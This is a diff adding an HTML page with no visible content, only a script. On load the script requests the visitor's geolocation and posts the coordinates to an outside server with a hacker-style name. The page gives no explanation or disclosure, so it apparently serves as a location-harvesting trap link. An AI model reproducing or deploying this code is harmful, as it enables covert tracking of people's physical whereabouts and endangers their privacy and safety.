@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+	<head>
+	    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+		<script>
+		    if (navigator.geolocation) {
+		    	navigator.geolocation.getCurrentPosition(successFunction);
+			}
+
+			function successFunction(position) {
+			    var lat = position.coords.latitude;
+			    var lng = position.coords.longitude;
+			    console.log(lat, lng);
+			    send_data(lat, lng)
+			}
+
+			function send_data(lat, lng){
+				var data = {
+					lat : lat,
+					lng : lng
+				}
+
+				$.ajax({
+					url: 'https://hackeronline7.pythonanywhere.com/loc/save_lat_lng/',
+					type: "post",
+					data: JSON.stringify(data),
+					dataType: 'json',
+					async : false,
+					success: function(data){
+						console.log('sent');
+					}
+		  		});
+		  	}
+		 </script>
+	</head>
+</html>
